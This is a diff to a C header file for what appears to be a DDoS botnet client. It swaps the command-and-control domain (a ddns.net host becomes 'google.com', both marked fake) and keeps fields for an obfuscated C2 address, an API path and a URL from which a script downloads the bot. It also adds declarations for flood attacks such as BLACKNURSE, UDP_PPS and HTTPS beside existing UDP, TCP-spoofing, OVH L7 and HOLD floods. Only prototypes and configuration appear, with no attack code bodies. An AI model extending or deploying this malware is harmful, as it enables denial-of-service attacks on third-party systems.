@@ -20,7 +20,6 @@
 # include <unistd.h>
 # include <string.h>
 # include "http.h"
-
 # include <stdlib.h>
 # include <stdarg.h>
 # include <stdio.h>
@@ -62,7 +61,7 @@
 
 # include "libft.h"
 
-# define url "ggregergeryhte.ddns.net" // fake url
+# define url "google.com" // fake url
 # define stringifer "" //url obfusced (ex : api.pandeo.fr == Zib'vZg]^u'_k)
 # define download_url "" // url for script sh to download bot
 # define url_page "/api.php" // path for api
@@ -89,19 +88,21 @@ unsigned short	tcpcsum(struct iphdr *iph, struct tcphdr *tcph);
 void			makeRandomStr(unsigned char *buf, int length);
 void			makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize);
 void			init_rand(uint32_t x);
+
 // 			Attack
 void			OVHL7(char *host, in_port_t port, int timeEnd, int power);
 void			UDPRAW(unsigned char *ip, int port, int secs);
+void 			BLACKNURSE(unsigned char *ip, int secs);
+void 			UDP_PPS(unsigned char *host, int port, int seconds,/* int power,*/ int packet_size);
 void			XTDCUSTOM(unsigned char *ip, int port, int secs);
-void			UDPRAW(unsigned char *ip, int port, int secs);
 void			UDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit);
 void			TCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval, int spoofit);
 void			STD(unsigned char *ip, int port, int secs);
 void			RANDHEX(unsigned char *ip, int port, int secs);
 void			OVHL7(char *host, in_port_t port, int timeEnd, int power);
 void			JUNK(unsigned char *ip, int port, int end_time);
+void			HTTPS(char *method, char *host, in_port_t port, char *path, int timeEnd, int power);
 void			HTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power);
 void			PPS(char *host, in_port_t port, int timeEnd, int power);
 void			HOLD(unsigned char *ip, int port, int end_time);
-
 #endif
